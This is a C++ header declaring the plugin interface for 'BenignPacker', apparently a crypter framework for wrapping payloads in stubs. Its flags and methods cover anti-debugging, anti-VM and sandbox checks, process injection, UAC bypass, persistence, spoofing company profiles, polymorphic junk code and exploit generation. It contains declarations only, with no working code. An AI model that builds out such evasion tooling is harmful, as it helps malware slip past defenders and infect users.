/*
 * ===== BENIGN PACKER - PLUGIN FRAMEWORK =====
 * Plugin interface definitions for BenignPacker
 * Compatible with Visual Studio 2022
 * Author: ItsMehRAWRXD/Star Framework
 */

#ifndef IPLUGIN_H
#define IPLUGIN_H

#include <string>
#include <vector>
#include <map>
#include <memory>
#include <chrono>

namespace BenignPacker {
namespace PluginFramework {

// Plugin API version
#define BENIGN_PACKER_PLUGIN_API_VERSION 1

// Plugin types
enum class PluginType {
    UNKNOWN = 0,
    STUB_GENERATOR = 1,
    ENCRYPTOR = 2,
    OBFUSCATOR = 3,
    PACKER = 4
};

// Plugin capabilities flags
enum class PluginCapabilities : uint32_t {
    NONE = 0x00000000,
    ENCRYPTION = 0x00000001,
    OBFUSCATION = 0x00000002,
    ANTI_DEBUG = 0x00000004,
    ANTI_VM = 0x00000008,
    MUTEX_PROTECTION = 0x00000010,
    COMPANY_SPOOFING = 0x00000020,
    POLYMORPHIC = 0x00000040,
    TIMING_CHECKS = 0x00000080,
    PROCESS_INJECTION = 0x00000100,
    UAC_BYPASS = 0x00000200,
    PERSISTENCE = 0x00000400,
    NETWORK_EXPLOITS = 0x00000800,
    ALL = 0xFFFFFFFF
};

// Plugin configuration
struct PluginConfig {
    std::string name;
    std::string version;
    std::string description;
    std::string author;
    PluginType type;
    PluginCapabilities capabilities;
    std::vector<std::string> supported_formats;
    std::vector<std::string> supported_methods;
    bool requires_admin;
    bool supports_encryption;
    bool supports_polymorphic;
    bool supports_anti_analysis;
};

// Execution context for plugin operations
struct ExecutionContext {
    std::string input_file;
    std::string output_file;
    std::vector<uint8_t> payload_data;
    std::map<std::string, std::string> parameters;
    bool verbose_mode;
    bool debug_mode;
    std::vector<std::string> additional_options;
};

// Plugin execution result
struct PluginResult {
    bool success;
    std::string message;
    std::vector<uint8_t> output_data;
    std::map<std::string, std::string> metadata;
    int exit_code;
    std::string error_details;
    std::chrono::milliseconds execution_time;
};

// Base plugin interface
class IPlugin {
public:
    virtual ~IPlugin() = default;
    
    // Core plugin methods
    virtual PluginConfig GetConfig() const = 0;
    virtual bool Initialize(const std::map<std::string, std::string>& settings) = 0;
    virtual PluginResult Execute(const ExecutionContext& context) = 0;
    
    // Plugin lifecycle
    virtual bool OnLoad() = 0;
    virtual bool OnUnload() = 0;
    virtual void OnError(const std::string& error) = 0;
};

// Stub generator interface
class IStubGenerator : public IPlugin {
public:
    virtual ~IStubGenerator() = default;
    
    // Stub generation methods
    virtual std::vector<uint8_t> GenerateStub(const std::vector<uint8_t>& payload) = 0;
    virtual std::vector<uint8_t> GenerateStubWithMethod(const std::vector<uint8_t>& payload, const std::string& method) = 0;
    
    // Template management
    virtual std::vector<std::string> GetAvailableTemplates() = 0;
    virtual bool LoadTemplate(const std::string& template_name) = 0;
    virtual bool SaveTemplate(const std::string& template_name, const std::string& template_data) = 0;
    
    // Encryption methods
    virtual std::vector<std::string> GetSupportedEncryption() = 0;
    virtual bool SetEncryptionMethod(const std::string& method) = 0;
    virtual std::vector<uint8_t> EncryptPayload(const std::vector<uint8_t>& payload, const std::string& method) = 0;
    
    // Anti-analysis methods
    virtual bool EnableAntiDebug(bool enable) = 0;
    virtual bool EnableAntiVM(bool enable) = 0;
    virtual bool EnableTimingChecks(bool enable) = 0;
    virtual bool EnableSandboxDetection(bool enable) = 0;
    
    // Mutex and protection
    virtual bool SetMutexName(const std::string& mutex_name) = 0;
    virtual bool EnableMutexProtection(bool enable) = 0;
    virtual std::vector<std::string> GetAvailableMutexes() = 0;
    
    // Company profile spoofing
    virtual std::vector<std::string> GetAvailableCompanies() = 0;
    virtual bool SetCompanyProfile(const std::string& company_name) = 0;
    virtual std::string GetCurrentCompany() const = 0;
    
    // Polymorphic features
    virtual bool EnablePolymorphic(bool enable) = 0;
    virtual bool SetPolymorphicLevel(int level) = 0;
    virtual std::vector<uint8_t> GenerateJunkCode(size_t size) = 0;
    
    // Exploit methods
    virtual std::vector<std::string> GetAvailableExploits() = 0;
    virtual bool EnableExploit(const std::string& exploit_name, bool enable) = 0;
    virtual std::vector<uint8_t> GenerateExploitCode(const std::string& exploit_name) = 0;
    
    // Utility methods
    virtual std::string GenerateRandomString(size_t length) = 0;
    virtual std::vector<uint8_t> GenerateRandomBytes(size_t length) = 0;
    virtual std::string GenerateUniqueIdentifier() = 0;
    virtual bool WriteToFile(const std::string& filename, const std::vector<uint8_t>& data) = 0;
};

// Plugin function types
typedef IPlugin* (*CreatePluginFunc)();
typedef void (*DestroyPluginFunc)(IPlugin* plugin);
typedef int (*GetApiVersionFunc)();
typedef const char* (*GetPluginNameFunc)();
typedef const char* (*GetPluginVersionFunc)();
typedef const char* (*GetPluginDescriptionFunc)();

// Plugin export functions
extern "C" {
    __declspec(dllexport) IPlugin* CreatePlugin();
    __declspec(dllexport) void DestroyPlugin(IPlugin* plugin);
    __declspec(dllexport) int GetApiVersion();
    __declspec(dllexport) const char* GetPluginName();
    __declspec(dllexport) const char* GetPluginVersion();
    __declspec(dllexport) const char* GetPluginDescription();
}

} // namespace PluginFramework
} // namespace BenignPacker

#endif // IPLUGIN_H